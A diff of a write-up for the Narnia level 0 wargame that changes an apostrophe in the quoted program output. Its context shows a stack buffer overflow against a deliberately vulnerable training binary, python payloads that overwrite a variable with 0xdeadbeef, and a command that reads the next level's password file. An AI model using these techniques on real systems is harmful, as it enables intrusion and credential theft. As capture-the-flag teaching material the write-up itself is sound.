@@ -35,7 +35,7 @@ int main(){
     long val=0x41414141;
     char buf[20];
 
-    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
+    printf("Correct vals value from 0x41414141 -> 0xdeadbeef!\n");
     printf("Here is your chance: ");
     scanf("%24s",&buf);
 
@@ -61,7 +61,7 @@ Looking at the code we can see that val has been assigned the hexadecimal value 
 
 Lets try running the program with 20 A's to see the output.
 ```bash
-narnia0@narnia:/narnia$ ./narnia0                                                                                     Correct val's value from 0x41414141 -> 0xdeadbeef!
+narnia0@narnia:/narnia$ ./narnia0                                                                                     Correct vals value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: AAAAAAAAAAAAAAAAAAAA
 buf: AAAAAAAAAAAAAAAAAAAA
 val: 0x41414100
@@ -71,7 +71,7 @@ WAY OFF!!!!
 Now lets see what happens if we can change `val` to another value by adding 20 A's and 4 B's.
 ```bash
 narnia0@narnia:/narnia$ ./narnia0
-Correct val's value from 0x41414141 -> 0xdeadbeef!
+Correct vals value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: AAAAAAAAAAAAAAAAAAAABBBB
 buf: AAAAAAAAAAAAAAAAAAAABBBB
 val: 0x42424242
@@ -81,7 +81,7 @@ It works! We were able to modify `val`. Now lets try giving the program what it 
 
 ```bash
 narnia0@narnia:~$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | /narnia/narnia0
-Correct val\'s value from 0x41414141 -> 0xdeadbeef!
+Correct vals value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef
 ```
@@ -92,7 +92,7 @@ Now that we have privilege escilation lets get the password for narnia1 from /et
 
 ```bash
 narnia0@narnia:~$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0
-Correct val\'s value from 0x41414141 -> 0xdeadbeef!
+Correct vals value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef
 efeidiedae       # password for narnia1
@@ -104,7 +104,7 @@ Alternatively, print the string, and copy & paste it to get the the narnia1 shel
 narnia0@narnia:/narnia$ (echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\xaf';cat)
 AAAAAAAAAAAAAAAAAAAAﾭޯ                             # copy this to paste it
 narnia0@narnia:/narnia$ ./narnia0
-Correct val\'s value from 0x41414141 -> 0xdeadbeef!
+Correct vals value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: AAAAAAAAAAAAAAAAAAAAﾭޯ 
 buf: AAAAAAAAAAAAAAAAAAAAﾭ
 val: 0xdeadbeef                                   # success! 
